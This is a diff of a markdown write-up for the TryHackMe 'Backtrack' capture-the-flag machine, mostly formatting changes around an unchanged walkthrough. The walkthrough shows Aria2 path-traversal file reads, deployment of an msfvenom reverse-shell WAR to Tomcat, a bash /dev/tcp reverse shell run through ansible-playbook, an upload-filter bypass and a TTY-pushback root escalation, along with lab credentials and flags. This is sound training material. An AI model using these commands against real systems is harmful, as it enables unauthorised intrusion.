@@ -2,18 +2,17 @@
 sticker: emoji//1f6e4-fe0f
 ---
 
-# BACKTRACK
+# ENUMERATION
+---
 
-## ENUMERATION
 
-***
 
-### OPEN PORTS
+## OPEN PORTS
+---
 
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 6800 | HTTP    |
 | 8080 | HTTP    |
@@ -63,17 +62,17 @@ PORT     STATE SERVICE         REASON  VERSION
 |     <!-- {{{ Icons -->
 ```
 
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 Let's begin by visiting each website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327122142.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327122142.png)
 
 Nothing visible on port `6800`, let's proceed:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327122208.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327122208.png)
 
 We got an apache tomcat `8.5.93` server, there's some directories I found by fuzzing but we need credentials in order to access them:
 
@@ -107,15 +106,16 @@ manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161
 
 What about `8888`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327122311.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327122311.png)
 
 We got a `Aria2 WebUI` application, let's try to find the server version:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327122856.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327122856.png)
+
 
 Let's try to search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327122935.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327122935.png)
 
 We got `CVE-2023-39141`, it talks about path traversal, let's try reproducing the PoC:
 
@@ -123,7 +123,8 @@ We got `CVE-2023-39141`, it talks about path traversal, let's try reproducing th
 curl --path-as-is http://10.10.252.252:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327123112.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327123112.png)
 
 It works, this is the `/etc/passwd` file:
 
@@ -167,9 +168,13 @@ orville:x:1003:1003::/home/orville:/bin/bash
 wilbur:x:1004:1004::/home/wilbur:/bin/bash
 ```
 
-## EXPLOITATION
 
-***
+
+
+
+# EXPLOITATION
+---
+
 
 Now that we know we got LFI, we can try reading `tomcat` configuration files, for example, let's try reading `/opt/tomcat/conf/tomcat-users.xml`:
 
@@ -193,15 +198,18 @@ We got credentials, let's try reading the log files:
 curl --path-as-is "http://10.10.252.252:8888/../../../../../../../../opt/tomcat/logs/catalina.out"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327125210.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327125210.png)
 
 We can find something interesting, a `reverse_shell.war` file was uploaded before, we can use this to do the following in order to get a shell:
 
 If an user's got `manager-script` privileges on tomcat, we can use curl to deploy a reverse shell.
 
+
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.34.159 LPORT=4444 -f war > shell.war
 ```
+
 
 Not, let's do the following to upload the shell:
 
@@ -211,7 +219,7 @@ curl -u 'tomcat:OPx52k53D8OkTZpx4fr' -X PUT --data-binary @shell.war "http://10.
 
 It says the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327125749.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327125749.png)
 
 Let's visit the url and start our listener:
 
@@ -219,13 +227,18 @@ Let's visit the url and start our listener:
 curl http://10.10.252.252:8080/shell/
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327125832.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327125832.png)
 
 There we go, we got our shell, let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+
+
+# PRIVILEGE ESCALATION
+---
+
 
 First step is stabilizing our shell:
 
@@ -239,19 +252,19 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327130031.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327130031.png)
 
 We can try reading our privileges:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327130213.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327130213.png)
 
 Let's check that directory:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327130356.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327130356.png)
 
 We can follow these notes to perform the `ansible playbook` privilege escalation:
 
-Notes: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/
+Notes: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/ 
 
 ```
 echo '/bin/bash -i >& /dev/tcp/10.6.34.159/1234 0>&1' > /tmp/wilbur.sh
@@ -266,6 +279,7 @@ We can now create a `.yml` script with the following contents:
       command: bash /tmp/wilbur.sh
 ```
 
+
 We need to give both scripts `777` privilege rights and then we can run this:
 
 ```
@@ -274,7 +288,7 @@ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/privesc.y
 
 Remember to set another listener and then send the command:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327132538.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327132538.png)
 
 We got our shell, let's stabilize it again:
 
@@ -288,9 +302,10 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327132625.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327132625.png)
 
 Nice, we can check these files in `wilbur` home:
+
 
 ```
 wilbur@Backtrack:/tmp$ ls -la /home/wilbur/
@@ -350,7 +365,7 @@ ssh -L 9000:localhost:80 wilbur@10.10.151.49
 
 Let's now access the website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327133549.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327133549.png)
 
 Since we got credentials, let's just access:
 
@@ -359,11 +374,12 @@ email : orville@backtrack.thm
 password : W34r3B3773r73nP3x3l$
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327133633.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327133633.png)
 
 If we try uploading a `.php` file, we get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327133933.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327133933.png)
 
 Let's send an image and check the behavior in our proxy, since this is a `localhost` server, our proxy may not be able to intercept the request, for this, let's simply make these two simple changes:
 
@@ -380,9 +396,10 @@ In this way, the proxy will think we are dealing with an external web applicatio
 http://localhost.com:9000/dashboard.php
 ```
 
+
 Just then, the proxy will start intercepting our requests, let's send a file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327140628.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327140628.png)
 
 Now we can see the request in our proxy.
 
@@ -392,7 +409,7 @@ Since we got some filters on the machine, we can try some bypasses to it, for ex
 .png.php
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327141101.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327141101.png)
 
 As seen, it gets uploaded, the upload directory is `uploads`, but in this directory we can only download files, not execute code, for this we can try another technique, we can try using path traversal to upload our file in a different directory:
 
@@ -400,7 +417,8 @@ As seen, it gets uploaded, the upload directory is `uploads`, but in this direct
 %252e%252e%252fUntitled.png
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327141314.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327141314.png)
 
 To check if it worked, we can try visiting:
 
@@ -408,7 +426,7 @@ To check if it worked, we can try visiting:
 localhost:9000/Untitled.png
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327141355.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327141355.png)
 
 There we go, we were able to change the directory where our uploads go into, let's try some basic stuff, let's try reading the php info, for this, change the extension to .php at the end and add this:
 
@@ -420,19 +438,19 @@ There we go, we were able to change the directory where our uploads go into, let
 <?php phpinfo();?>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142014.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142014.png)
 
 It uploaded, let's check if it worked:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142031.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142031.png)
 
 There we go, next step would be uploading a reverse shell, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142217.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142217.png)
 
 It worked, let's set up our listener and visit the page:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142250.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142250.png)
 
 There we go, we got our shell, we need to stabilize it again:
 
@@ -446,31 +464,34 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142336.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142336.png)
 
 With a shell as orville, we can use `linpeas` to search for any way to get into root:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327142846.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327142846.png)
 
 We can see some file called `web_snapshot.zip`, let's check what its about:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327143206.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327143206.png)
 
 We got credentials to the db, inside of it, we cannot find anything important such as root password:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327143620.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327143620.png)
 
 Now, we can try to monitor the processes using `pspy`, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327144215.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327144215.png)
+
 
 We can see this, there's a `su - orville` since there are some other processes running before this, we must conclude that the root user is switching to orville, after searching for a while, I found this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327144608.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327144608.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327144639.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327144639.png)
+
 
 Website: https://www.errno.fr/TTYPushback.html
+
 
 We can see it's the same case we are dealing with, let's copy the contents of the python script to a file in `orville` home:
 
@@ -499,7 +520,7 @@ And finally, we can use:
 bash -p
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327145752.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327145752.png)
 
 Since we are finally root, let's read all flags, since I don't know where they are, let's simply find them:
 
@@ -534,4 +555,6 @@ bash-5.0# cat /root/flag3.txt
 THM{f728e7c00162e6d316720155a4a06fa8}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327150045.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327150045.png)
+
+
